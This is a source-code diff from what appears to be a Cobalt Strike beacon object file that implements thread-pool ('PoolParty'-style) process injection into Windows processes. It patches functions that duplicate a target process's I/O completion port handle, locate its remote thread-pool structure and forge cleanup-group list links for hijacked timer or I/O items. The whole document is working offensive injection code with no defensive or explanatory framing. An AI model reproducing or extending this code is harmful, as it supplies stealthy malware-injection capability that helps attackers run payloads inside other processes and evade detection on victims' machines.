@@ -1389,6 +1389,31 @@ static void SanitizeCleanupGroupMember(PTPP_CLEANUP_GROUP_MEMBER m) {
     m->PoolObjectLinks.Blink = NULL;
 }
 
+#if defined(PP_NEED_TP_IO) || defined(PP_HIJACK_TIMER)
+static void RemoteSelfLink(PLIST_ENTRY localLink, ULONG_PTR remoteLinkAddress) {
+    localLink->Flink = (PLIST_ENTRY)remoteLinkAddress;
+    localLink->Blink = (PLIST_ENTRY)remoteLinkAddress;
+}
+
+/*
+ * A copied cleanup-group member is a singleton in the target. Its list links
+ * must therefore refer to the remote member, not NULL or beacon-local lists.
+ */
+static void FinalizeRemoteCleanupGroupMemberLinks(
+    PTPP_CLEANUP_GROUP_MEMBER localMember,
+    ULONG_PTR remoteMemberAddress) {
+    if (localMember == NULL || remoteMemberAddress == 0) {
+        return;
+    }
+    RemoteSelfLink(
+        &localMember->CleanupGroupMemberLinks,
+        remoteMemberAddress + offsetof(TPP_CLEANUP_GROUP_MEMBER, CleanupGroupMemberLinks));
+    RemoteSelfLink(
+        &localMember->PoolObjectLinks,
+        remoteMemberAddress + offsetof(TPP_CLEANUP_GROUP_MEMBER, PoolObjectLinks));
+}
+#endif
+
 #ifdef PP_NEED_TP_IO
 static VOID CALLBACK DummyIoCallback(
     PTP_CALLBACK_INSTANCE Instance,
@@ -1915,7 +1940,7 @@ static BOOL HandleTypeNameIs(HANDLE h, const unsigned char *enc, int n) {
     return ok;
 }
 
-static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory) {
+static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory, PFULL_TP_POOL *ppRemotePool) {
     WORKER_FACTORY_BASIC_INFORMATION info;
     HANDLE remoteIocp;
     HANDLE localIocp;
@@ -1923,10 +1948,13 @@ static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory) {
 
     remoteIocp = NULL;
     localIocp = NULL;
+    if (ppRemotePool != NULL) {
+        *ppRemotePool = NULL;
+    }
     if (!QueryWorkerFactoryBasicInformation(hWorkerFactory, &info)) {
         return NULL;
     }
-    if (info.StartParameter == NULL) {
+    if (!PlausibleUserPtr(info.StartParameter, FALSE)) {
         return NULL;
     }
     portAddr = (LPCVOID)((ULONG_PTR)info.StartParameter + offsetof(FULL_TP_POOL, CompletionPort));
@@ -1946,16 +1974,17 @@ static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory) {
             0)) {
         return NULL;
     }
-    if (m_bSanityOnly) {
-        if (!HandleTypeNameIs(localIocp, kTypeIoCompletion, (int)sizeof(kTypeIoCompletion))) {
-            KERNEL32$CloseHandle(localIocp);
-            return NULL;
-        }
+    if (!HandleTypeNameIs(localIocp, kTypeIoCompletion, (int)sizeof(kTypeIoCompletion))) {
+        KERNEL32$CloseHandle(localIocp);
+        return NULL;
+    }
+    if (ppRemotePool != NULL) {
+        *ppRemotePool = (PFULL_TP_POOL)info.StartParameter;
     }
     return localIocp;
 }
 
-static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
+static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget, PFULL_TP_POOL *ppRemotePool) {
     BYTE *Information;
     PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
     ULONG_PTR i;
@@ -1966,6 +1995,9 @@ static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
     int wfChars;
 
     found = NULL;
+    if (ppRemotePool != NULL) {
+        *ppRemotePool = NULL;
+    }
     if (p_hTarget == NULL) {
         return NULL;
     }
@@ -2031,7 +2063,7 @@ static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
             continue;
         }
 
-        hIocp = DuplicatePoolIoCompletion(hWf);
+        hIocp = DuplicatePoolIoCompletion(hWf, ppRemotePool);
         KERNEL32$CloseHandle(hWf);
         if (hIocp != NULL) {
             found = hIocp;
@@ -2427,7 +2459,7 @@ static BOOL VariantSanity(void) {
 #endif
 
 #ifdef PP_RESOLVE_POOL_IOCP
-    hIocp = HijackThreadPoolIoCompletion(m_p_hTargetPid);
+    hIocp = HijackThreadPoolIoCompletion(m_p_hTargetPid, NULL);
     if (hIocp == NULL) {
         SANITY_FAIL(kFmtIocpType, kFmtSuggestLayout);
         InjectCleanup();
